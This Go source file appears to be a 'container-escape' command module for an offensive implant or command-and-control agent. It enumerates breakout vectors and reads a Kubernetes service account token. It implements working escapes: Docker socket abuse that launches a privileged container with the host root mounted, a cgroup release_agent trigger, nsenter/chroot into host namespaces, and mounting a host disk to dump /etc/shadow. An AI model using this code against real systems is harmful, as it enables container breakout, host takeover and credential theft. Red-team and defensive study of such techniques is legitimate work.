//go:build linux

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"fawkes/pkg/structs"
)

// ContainerEscapeCommand attempts container escape techniques.
type ContainerEscapeCommand struct{}

func (c *ContainerEscapeCommand) Name() string { return "container-escape" }
func (c *ContainerEscapeCommand) Description() string {
	return "Attempt container escape via known breakout techniques"
}

type containerEscapeArgs struct {
	Action  string `json:"action"`
	Command string `json:"command"`
	Image   string `json:"image"`
	Path    string `json:"path"`
}

func (c *ContainerEscapeCommand) Execute(task structs.Task) structs.CommandResult {
	var args containerEscapeArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse arguments: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Action == "" {
		args.Action = "check"
	}

	var output string
	var status string

	switch args.Action {
	case "check":
		output, status = escapeCheck()
	case "docker-sock":
		output, status = escapeDockerSock(args.Command, args.Image)
	case "cgroup":
		output, status = escapeCgroupNotify(args.Command)
	case "nsenter":
		output, status = escapeNsenter(args.Command)
	case "mount-host":
		output, status = escapeMountHost(args.Path)
	default:
		output = fmt.Sprintf("Unknown action: %s. Use: check, docker-sock, cgroup, nsenter, mount-host", args.Action)
		status = "error"
	}

	return structs.CommandResult{
		Output:    output,
		Status:    status,
		Completed: true,
	}
}

// escapeCheck enumerates all available escape vectors without exploiting them.
func escapeCheck() (string, string) {
	var sb strings.Builder
	sb.WriteString("=== CONTAINER ESCAPE VECTOR CHECK ===\n\n")

	vectors := 0

	// 1. Docker socket
	for _, sock := range []string{"/var/run/docker.sock", "/run/docker.sock"} {
		if info, err := os.Stat(sock); err == nil {
			mode := info.Mode()
			// Check if writable
			if mode&0o002 != 0 || (mode&0o020 != 0) {
				sb.WriteString(fmt.Sprintf("[!] Docker socket: %s (mode: %s) — WRITABLE\n", sock, mode))
				sb.WriteString("    Use: container-escape -action docker-sock -command '<cmd>'\n\n")
				vectors++
			} else {
				sb.WriteString(fmt.Sprintf("[*] Docker socket: %s (mode: %s) — exists but check permissions\n", sock, mode))
			}
		}
	}

	// 2. Privileged container (all capabilities + no seccomp)
	privileged := false
	if data, err := os.ReadFile("/proc/self/status"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			if strings.HasPrefix(line, "CapEff:") {
				cap := strings.TrimSpace(strings.TrimPrefix(line, "CapEff:"))
				// Full caps = likely privileged
				if cap == "0000003fffffffff" || cap == "000001ffffffffff" || cap == "000003ffffffffff" {
					sb.WriteString("[!] Full capabilities detected — likely PRIVILEGED container\n")
					privileged = true
					vectors++
				}
			}
		}
	}

	// 3. Cgroup release_agent (privileged only)
	if privileged {
		// Check if we can write to cgroup
		if data, err := os.ReadFile("/proc/1/cgroup"); err == nil {
			cgroupPath := extractCgroupPath(string(data))
			if cgroupPath != "" {
				sb.WriteString(fmt.Sprintf("[!] Cgroup path: %s — release_agent escape may be possible\n", cgroupPath))
				sb.WriteString("    Use: container-escape -action cgroup -command '<cmd>'\n\n")
				vectors++
			}
		}
	}

	// 4. Host PID namespace (/proc/1/ns/pid check)
	if selfNS, err := os.Readlink("/proc/self/ns/pid"); err == nil {
		if hostNS, err := os.Readlink("/proc/1/ns/pid"); err == nil {
			if selfNS == hostNS {
				sb.WriteString("[!] Sharing PID namespace with host — nsenter escape possible\n")
				sb.WriteString("    Use: container-escape -action nsenter -command '<cmd>'\n\n")
				vectors++
			} else {
				sb.WriteString(fmt.Sprintf("[*] PID namespace: container=%s, host=%s (isolated)\n", selfNS, hostNS))
			}
		}
	}

	// 5. /proc/sysrq-trigger (host access indicator)
	if _, err := os.Stat("/proc/sysrq-trigger"); err == nil {
		// Check if writable
		if f, err := os.OpenFile("/proc/sysrq-trigger", os.O_WRONLY, 0); err == nil {
			f.Close()
			sb.WriteString("[!] /proc/sysrq-trigger is writable — host kernel access\n\n")
			vectors++
		}
	}

	// 6. Device access (privileged indicator)
	for _, dev := range []string{"/dev/sda", "/dev/vda", "/dev/xvda", "/dev/nvme0n1"} {
		if _, err := os.Stat(dev); err == nil {
			sb.WriteString(fmt.Sprintf("[!] Host block device accessible: %s\n", dev))
			sb.WriteString("    Use: container-escape -action mount-host -path /dev/sda\n\n")
			vectors++
			break
		}
	}

	// 7. K8s service account token
	tokenPath := "/var/run/secrets/kubernetes.io/serviceaccount/token"
	if data, err := os.ReadFile(tokenPath); err == nil {
		token := string(data)
		if len(token) > 50 {
			token = token[:50] + "..."
		}
		sb.WriteString(fmt.Sprintf("[!] K8s service account token found: %s\n", token))
		sb.WriteString("    Potential for K8s API abuse (pod creation, secret access)\n\n")
		vectors++
	}

	// 8. K8s namespace/SA info
	if ns, err := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace"); err == nil {
		sb.WriteString(fmt.Sprintf("[*] K8s namespace: %s\n", strings.TrimSpace(string(ns))))
	}

	// 9. Mounted host filesystems
	if data, err := os.ReadFile("/proc/mounts"); err == nil {
		for _, line := range strings.Split(string(data), "\n") {
			fields := strings.Fields(line)
			if len(fields) >= 2 {
				mountpoint := fields[1]
				// Look for host filesystem mounts
				if strings.HasPrefix(mountpoint, "/host") ||
					(strings.HasPrefix(mountpoint, "/") && fields[0] == "/dev/sda1") {
					sb.WriteString(fmt.Sprintf("[!] Potential host mount: %s → %s\n", fields[0], mountpoint))
					vectors++
				}
			}
		}
	}

	sb.WriteString(fmt.Sprintf("\n=== %d escape vector(s) identified ===\n", vectors))
	if vectors == 0 {
		sb.WriteString("No obvious escape vectors found. Container appears well-isolated.\n")
	}

	return sb.String(), "success"
}

// escapeDockerSock exploits a mounted Docker socket to run a command on the host.
func escapeDockerSock(command, image string) (string, string) {
	if command == "" {
		return "Required: -command '<host command to run>'", "error"
	}
	if image == "" {
		image = "alpine"
	}

	// Find the socket
	sockPath := ""
	for _, sock := range []string{"/var/run/docker.sock", "/run/docker.sock"} {
		if _, err := os.Stat(sock); err == nil {
			sockPath = sock
			break
		}
	}
	if sockPath == "" {
		return "Docker socket not found at /var/run/docker.sock or /run/docker.sock", "error"
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] Using Docker socket: %s\n", sockPath))
	sb.WriteString(fmt.Sprintf("[*] Image: %s\n", image))
	sb.WriteString(fmt.Sprintf("[*] Command: %s\n\n", command))

	// Use curl to communicate with Docker API via Unix socket
	// Create a container with host mount and run the command
	createJSON := fmt.Sprintf(`{"Image":"%s","Cmd":["/bin/sh","-c","%s"],"HostConfig":{"Binds":["/:/hostfs"],"Privileged":true}}`,
		image, strings.ReplaceAll(command, `"`, `\"`))

	// Create container
	out, err := exec.Command("curl", "-s", "--unix-socket", sockPath,
		"-X", "POST",
		"-H", "Content-Type: application/json",
		"-d", createJSON,
		"http://localhost/containers/create").CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Failed to create container: %v\n%s", err, string(out)), "error"
	}

	// Parse container ID
	var createResp struct {
		ID string `json:"Id"`
	}
	if err := json.Unmarshal(out, &createResp); err != nil || createResp.ID == "" {
		return fmt.Sprintf("Failed to parse container creation response: %s", string(out)), "error"
	}
	containerID := createResp.ID[:12]
	sb.WriteString(fmt.Sprintf("[+] Container created: %s\n", containerID))

	// Start container
	out, err = exec.Command("curl", "-s", "--unix-socket", sockPath,
		"-X", "POST",
		fmt.Sprintf("http://localhost/containers/%s/start", containerID)).CombinedOutput()
	if err != nil {
		sb.WriteString(fmt.Sprintf("[!] Failed to start container: %v\n", err))
		return sb.String(), "error"
	}
	sb.WriteString("[+] Container started\n")

	// Wait for completion and get logs
	exec.Command("curl", "-s", "--unix-socket", sockPath,
		fmt.Sprintf("http://localhost/containers/%s/wait", containerID)).CombinedOutput()

	logs, _ := exec.Command("curl", "-s", "--unix-socket", sockPath,
		fmt.Sprintf("http://localhost/containers/%s/logs?stdout=true&stderr=true", containerID)).CombinedOutput()

	sb.WriteString("\n--- Output ---\n")
	// Docker logs have 8-byte header per line; strip it
	sb.WriteString(cleanDockerLogs(string(logs)))

	// Cleanup: remove container
	exec.Command("curl", "-s", "--unix-socket", sockPath,
		"-X", "DELETE",
		fmt.Sprintf("http://localhost/containers/%s?force=true", containerID)).CombinedOutput()
	sb.WriteString("\n[+] Container removed\n")

	return sb.String(), "success"
}

// escapeCgroupNotify uses the cgroup release_agent for host command execution (requires privileged).
func escapeCgroupNotify(command string) (string, string) {
	if command == "" {
		return "Required: -command '<host command to run>'", "error"
	}

	var sb strings.Builder
	sb.WriteString("[*] Attempting cgroup release_agent escape\n")

	// Create a temp cgroup
	cgroupDir := "/tmp/cgrp_escape"
	if err := os.MkdirAll(cgroupDir, 0o755); err != nil {
		return fmt.Sprintf("Failed to create cgroup dir: %v", err), "error"
	}

	// Mount a cgroup hierarchy
	if err := syscall.Mount("cgroup", cgroupDir, "cgroup", 0, "rdma"); err != nil {
		// Try memory controller instead
		if err := syscall.Mount("cgroup", cgroupDir, "cgroup", 0, "memory"); err != nil {
			os.Remove(cgroupDir)
			return fmt.Sprintf("Failed to mount cgroup: %v (need privileged container)", err), "error"
		}
	}
	sb.WriteString("[+] Cgroup mounted\n")

	// Create child cgroup
	childDir := filepath.Join(cgroupDir, "x")
	if err := os.MkdirAll(childDir, 0o755); err != nil {
		syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to create child cgroup: %v", err), "error"
	}

	// Get the container's path on the host filesystem
	hostPath := ""
	if data, err := os.ReadFile("/proc/self/cgroup"); err == nil {
		// Extract the overlay upperdir or similar
		for _, line := range strings.Split(string(data), "\n") {
			parts := strings.SplitN(line, ":", 3)
			if len(parts) == 3 && parts[2] != "/" {
				hostPath = parts[2]
				break
			}
		}
	}

	// Write the release_agent path
	// We need to know our path on the host — write a script that's accessible from host
	scriptPath := "/cmd_escape"
	outputPath := "/output_escape"

	// Write script
	script := fmt.Sprintf("#!/bin/sh\n%s > %s 2>&1\n", command, outputPath)
	if err := os.WriteFile(scriptPath, []byte(script), 0o755); err != nil {
		syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to write escape script: %v", err), "error"
	}

	// The release_agent needs the full host path to the script
	// This is the tricky part — we need to figure out our overlay path on the host
	releaseAgentScript := scriptPath
	if hostPath != "" {
		// For overlay containers, the script is at the merged path
		sb.WriteString(fmt.Sprintf("[*] Container cgroup path: %s\n", hostPath))
	}

	// Set release_agent
	releaseAgentPath := filepath.Join(cgroupDir, "release_agent")
	if err := os.WriteFile(releaseAgentPath, []byte(releaseAgentScript), 0o644); err != nil {
		os.Remove(scriptPath)
		syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to set release_agent: %v", err), "error"
	}
	sb.WriteString("[+] release_agent set\n")

	// Enable notify_on_release
	notifyPath := filepath.Join(childDir, "notify_on_release")
	if err := os.WriteFile(notifyPath, []byte("1"), 0o644); err != nil {
		os.Remove(scriptPath)
		syscall.Unmount(cgroupDir, 0)
		os.RemoveAll(cgroupDir)
		return fmt.Sprintf("Failed to enable notify_on_release: %v", err), "error"
	}

	// Trigger by writing our PID to child cgroup then removing it
	cgroupProcs := filepath.Join(childDir, "cgroup.procs")
	os.WriteFile(cgroupProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644)

	// Move back to parent and remove child to trigger release
	parentProcs := filepath.Join(cgroupDir, "cgroup.procs")
	os.WriteFile(parentProcs, []byte(fmt.Sprintf("%d", os.Getpid())), 0o644)
	os.Remove(childDir)

	sb.WriteString("[+] Triggered release_agent\n")

	// Check for output
	if data, err := os.ReadFile(outputPath); err == nil {
		sb.WriteString("\n--- Output ---\n")
		sb.WriteString(string(data))
		os.Remove(outputPath)
	} else {
		sb.WriteString("[!] No output file — release_agent may not have fired (host path resolution issue)\n")
		sb.WriteString("    This technique requires the script path to be valid on the host filesystem\n")
	}

	// Cleanup
	os.Remove(scriptPath)
	syscall.Unmount(cgroupDir, 0)
	os.RemoveAll(cgroupDir)

	return sb.String(), "success"
}

// escapeNsenter enters the host PID namespace to run a command.
func escapeNsenter(command string) (string, string) {
	if command == "" {
		return "Required: -command '<host command to run>'", "error"
	}

	// Check if we share PID namespace with host
	selfNS, err := os.Readlink("/proc/self/ns/pid")
	if err != nil {
		return fmt.Sprintf("Cannot read PID namespace: %v", err), "error"
	}
	hostNS, err := os.Readlink("/proc/1/ns/pid")
	if err != nil {
		return fmt.Sprintf("Cannot read host PID namespace: %v", err), "error"
	}
	if selfNS != hostNS {
		return fmt.Sprintf("PID namespaces differ (self=%s, host=%s) — nsenter not available", selfNS, hostNS), "error"
	}

	// Use nsenter to enter all host namespaces
	out, err := exec.Command("nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid",
		"--", "/bin/sh", "-c", command).CombinedOutput()
	if err != nil {
		// nsenter might not be available, try via /proc/1/root
		if _, statErr := os.Stat("/proc/1/root"); statErr == nil {
			out, err = exec.Command("chroot", "/proc/1/root", "/bin/sh", "-c", command).CombinedOutput()
			if err != nil {
				return fmt.Sprintf("Both nsenter and chroot failed: %v\n%s", err, string(out)), "error"
			}
			return fmt.Sprintf("[+] Executed via chroot /proc/1/root\n\n--- Output ---\n%s", string(out)), "success"
		}
		return fmt.Sprintf("nsenter failed: %v\n%s", err, string(out)), "error"
	}

	return fmt.Sprintf("[+] Executed via nsenter\n\n--- Output ---\n%s", string(out)), "success"
}

// escapeMountHost mounts a host block device to access the host filesystem.
func escapeMountHost(devicePath string) (string, string) {
	if devicePath == "" {
		// Auto-detect
		for _, dev := range []string{"/dev/sda1", "/dev/vda1", "/dev/xvda1", "/dev/nvme0n1p1", "/dev/sda", "/dev/vda"} {
			if _, err := os.Stat(dev); err == nil {
				devicePath = dev
				break
			}
		}
		if devicePath == "" {
			return "No host block device found. Specify with -path /dev/sdX", "error"
		}
	}

	mountPoint := "/tmp/hostfs_escape"
	if err := os.MkdirAll(mountPoint, 0o755); err != nil {
		return fmt.Sprintf("Failed to create mount point: %v", err), "error"
	}

	// Mount the device
	if err := syscall.Mount(devicePath, mountPoint, "ext4", syscall.MS_RDONLY, ""); err != nil {
		// Try xfs
		if err := syscall.Mount(devicePath, mountPoint, "xfs", syscall.MS_RDONLY, ""); err != nil {
			os.Remove(mountPoint)
			return fmt.Sprintf("Failed to mount %s: %v (need CAP_SYS_ADMIN)", devicePath, err), "error"
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Mounted %s at %s (read-only)\n\n", devicePath, mountPoint))

	// List interesting files
	interesting := []string{
		"/etc/shadow",
		"/etc/passwd",
		"/root/.ssh/authorized_keys",
		"/root/.bash_history",
		"/etc/kubernetes",
	}

	sb.WriteString("--- Host filesystem contents ---\n")
	for _, path := range interesting {
		fullPath := filepath.Join(mountPoint, path)
		if info, err := os.Stat(fullPath); err == nil {
			sb.WriteString(fmt.Sprintf("  [FOUND] %s (%d bytes)\n", path, info.Size()))
		}
	}

	// Read /etc/shadow if possible
	shadowPath := filepath.Join(mountPoint, "etc/shadow")
	if data, err := os.ReadFile(shadowPath); err == nil {
		lines := strings.Split(string(data), "\n")
		sb.WriteString(fmt.Sprintf("\n--- /etc/shadow (%d entries) ---\n", len(lines)))
		for _, line := range lines {
			if line != "" {
				sb.WriteString(line + "\n")
			}
		}
	}

	sb.WriteString(fmt.Sprintf("\n[*] Host filesystem mounted at %s — use cat/ls to explore\n", mountPoint))
	sb.WriteString("[*] Remember to clean up: unmount when done\n")

	return sb.String(), "success"
}

// extractCgroupPath gets the container's cgroup path from /proc/1/cgroup.
func extractCgroupPath(content string) string {
	for _, line := range strings.Split(content, "\n") {
		parts := strings.SplitN(line, ":", 3)
		if len(parts) == 3 && parts[2] != "/" && parts[2] != "" {
			return parts[2]
		}
	}
	return ""
}

// cleanDockerLogs strips the 8-byte Docker log header from each line.
func cleanDockerLogs(raw string) string {
	var sb strings.Builder
	for _, line := range strings.Split(raw, "\n") {
		if len(line) > 8 {
			sb.WriteString(line[8:] + "\n")
		} else if line != "" {
			sb.WriteString(line + "\n")
		}
	}
	return sb.String()
}
